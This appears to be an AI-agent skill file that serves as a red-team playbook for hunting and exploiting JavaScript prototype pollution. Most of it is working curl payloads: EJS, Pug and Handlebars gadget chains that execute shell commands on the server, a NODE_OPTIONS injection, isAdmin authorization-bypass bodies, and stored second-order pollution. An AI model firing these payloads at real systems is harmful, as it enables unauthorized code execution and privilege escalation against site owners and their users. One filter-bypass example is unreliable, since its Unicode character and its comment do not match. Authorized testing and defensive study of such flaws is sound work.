---
name: hunt-prototype-pollution
description: Hunt client-side and server-side prototype pollution for XSS, auth bypass, and RCE.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, python3, node
metadata:
  tags: [redteam, prototype-pollution, XSS, RCE, JavaScript, Node.js, jQuery]
  category: redteam
  related_skills:
    - hunt-nodejs
    - hunt-xss
    - hunt-api-misconfig
---

# Prototype Pollution Hunting

Hunt for prototype pollution vulnerabilities where user-supplied properties merge into `Object.prototype`, affecting all objects in the runtime. Client-side pollution enables DOM XSS, cookie manipulation, and auth bypass. Server-side pollution chains to RCE via gadget chains in template engines (EJS, Pug, Handlebars) and CLI wrappers (child_process, NODE_OPTIONS).

## When to Use

- Application uses JavaScript/Node.js with object merge, clone, or extend operations on user input.
- jQuery `$.extend(true, ...)` or `$.fn.merge()` with deep copy on untrusted data.
- Lodash `_.merge()`, `_.defaultsDeep()`, `_.set()` receiving request body/query params.
- Template engines (EJS, Pug, Handlebars) in the same runtime as user-controlled objects.
- Server-side Node.js with `child_process.exec`/`spawn` accessible via polluted options.

## Quick Detection

```bash
# client-side: pollute via query param
curl -sk "https://target.com/page?__proto__[polluted]=true"

# server-side: pollute via JSON body
curl -sk -X POST "https://target.com/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

## Procedure

### Phase 1 — Client-Side Pollution Vectors

```bash
# URL query string
https://target.com/?__proto__[test]=polluted
https://target.com/?constructor[prototype][test]=polluted

# JSON body in API
curl -sk -X POST "https://target.com/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"yes"}}'

# Form-encoded
curl -sk -X POST "https://target.com/form" \
  -d '__proto__[polluted]=true'

# Via Object.assign / spread in request handlers
curl -sk -X PATCH "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'
```

### Phase 2 — Server-Side RCE via Gadget Chains

**EJS RCE (outputFunctionName):**
```bash
curl -sk -X POST "https://target.com/api/render" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"_tmp;global.process.mainModule.require(\"child_process\").execSync(\"id\");"}}'
```

**Pug RCE (self.block):**
```bash
curl -sk -X POST "https://target.com/api/preferences" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require(\"child_process\").execSync(\"id\")"}}}'
```

**Handlebars RCE (compileFunction):**
```bash
curl -sk -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"precompileOptions":{"knownHelpersOnly":false,"compat":true},"compileFunction":"return process.mainModule.require(\"child_process\").execSync(\"id\").toString();"}}'
```

**NODE_OPTIONS injection:**
```bash
curl -sk -X POST "https://target.com/api/task" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","shell":"/bin/sh","env":{"NODE_DEBUG":"test"}}}'
```

### Phase 3 — Filter Bypass Techniques

```bash
# Unicode normalization (e.g., ä → a)
https://target.com/?__proto__[test]=1         # blocked
https://target.com/?__pröto__[test]=1         # bypass (ä normalizes to a)

# constructor.prototype path
curl -sk -X POST "https://target.com/api/data" \
  -d '{"constructor":{"prototype":{"polluted":true}}}'

# Array pollution (lodash specific)
curl -sk -X POST "https://target.com/api/data" \
  -d '{"__proto__":{"polluted":[]}}'  # forces array coercion

# ppfuzz — automated prototype pollution scanner
ppfuzz -u https://target.com/api/merge -m POST -H "Content-Type: application/json"
```

### Phase 4 — Client-Side Exploitation

```javascript
// Verify pollution in browser console
Object.prototype.polluted  // should return the injected value

// DOM XSS via polluted options
// If the app uses jQuery $.extend with polluted {url: "javascript:alert(1)"}

// Auth bypass: pollute isAdmin
// If the app checks if (user.isAdmin) without hasOwnProperty
```

### Phase 5 — Second-Order Pollution

```bash
# Store pollution in database, triggered by background job
curl -sk -X POST "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":{"__proto__":{"isAdmin":true}}}'

# Later, when an admin views the profile or a cron job processes it,
# the pollution triggers in that context
```

## Pitfalls

- **Not every `__proto__` in a request is a finding.** Only report when the polluted property actually affects application behavior.
- **Node.js 12+ and newer lodash versions have partial mitigations.** Test with older versions first.
- **Server-side pollution requires a gadget.** Polluting random objects without reaching a sink (exec, eval, template) has no impact.
- **BlackFan's client-side prototype pollution catalog** is the canonical reference — cross-check findings against it.

## Verification

1. Inject `__proto__[test]=value` and verify `Object.prototype.test === value` in browser console or server response.
2. For RCE: confirm command execution produces output (id/whoami) in a visible sink.
3. For XSS: verify the polluted property reaches `innerHTML`, `eval`, `document.write`, or a script `src` attribute.
4. Document the exact merge/copy function and the polluted property chain.

## Related Skills

- **`hunt-nodejs`** — Node.js-specific vulnerabilities including prototype pollution in Express/Next.js.
- **`hunt-xss`** — DOM XSS often exploitable through client-side prototype pollution.
- **`hunt-api-misconfig`** — Object merge on request bodies without `hasOwnProperty` checks.
